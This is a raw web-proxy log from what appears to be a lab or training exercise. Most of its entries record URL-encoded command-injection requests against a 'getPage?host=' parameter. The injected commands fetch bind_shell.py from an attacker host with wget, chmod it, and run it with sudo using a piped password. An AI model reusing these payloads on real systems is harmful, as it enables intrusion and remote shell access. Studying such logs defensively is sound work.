Attaching to target_proxy_1, target_webapp_1
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:14:09:20 +0000] "GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py HTTP/1.1" 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bsudo+python+bind_shell.py" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:14:10:34 +0000] "GET /getPage?host=8.8.8.8%3Becho+%27cyexc%27+%7C+sudo+-S+python+bind_shell.py HTTP/1.1" 504 183 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 2018/01/20 14:10:34 [error] 5#5: *1 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 192.168.33.1, server: , request: "GET /getPage?host=8.8.8.8%3Becho+%27cyexc%27+%7C+sudo+-S+python+bind_shell.py HTTP/1.1", upstream: "http://192.168.1.10:8080/getPage?host=8.8.8.8%3Becho+%27cyexc%27+%7C+sudo+-S+python+bind_shell.py", host: "target.cyexc-target", referrer: "http://target.cyexc-target/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:14:36:30 +0000] "GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind.py HTTP/1.1" 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:15:21:12 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:15:21:19 +0000] "GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1" 200 1318 "http://target.cyexc-target/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:15:21:43 +0000] "GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+777+bind_shell.py HTTP/1.1" 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bls+-l" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:15:21:49 +0000] "GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1" 200 1380 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+777+bind_shell.py" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:15:23:22 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:15:24:37 +0000] "GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1" 200 1380 "http://target.cyexc-target/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[36mproxy_1   |[0m 192.168.33.1 - - [20/Jan/2018:15:25:03 +0000] "GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+777+bind_shell.py HTTP/1.1" 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bls+-l" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
